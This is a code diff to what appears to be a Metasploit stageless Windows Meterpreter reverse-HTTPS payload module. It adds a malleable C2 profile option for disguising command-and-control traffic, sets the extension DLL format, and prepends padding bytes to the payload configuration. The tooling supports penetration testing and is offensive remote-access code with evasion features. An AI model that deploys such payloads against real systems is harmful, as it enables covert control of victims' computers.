@@ -4,7 +4,7 @@
 ##
 
 module MetasploitModule
-  CachedSize = 200284
+  CachedSize = :dynamic
 
   include Msf::Payload::TransportConfig
   include Msf::Payload::Windows
@@ -28,6 +28,7 @@ module MetasploitModule
     )
 
     register_options([
+      OptPath.new('MALLEABLEC2', [false, 'Path to a file containing the malleable C2 profile']),
       OptString.new('EXTENSIONS', [false, 'Comma-separate list of extensions to load']),
       OptString.new('EXTINIT', [false, 'Initialization strings for extensions'])
     ])
@@ -45,6 +46,7 @@ module MetasploitModule
 
   def generate_config(opts = {})
     opts[:uuid] ||= generate_payload_uuid
+    opts[:c2_profile] = datastore['MALLEABLEC2']
 
     # create the configuration block
     config_opts = {
@@ -54,6 +56,7 @@ module MetasploitModule
       uuid: opts[:uuid],
       transports: [transport_config_reverse_https(opts)],
       extensions: (datastore['EXTENSIONS'] || '').split(','),
+      ext_format: 'x86.dll',
       ext_init: datastore['EXTINIT'] || '',
       stageless: true
     }.merge(meterpreter_logging_config(opts))
@@ -62,6 +65,6 @@ module MetasploitModule
     config = Rex::Payloads::Meterpreter::Config.new(config_opts)
 
     # return the binary version of it
-    config.to_b
+    "\x00" * 8 + config.to_b
   end
 end
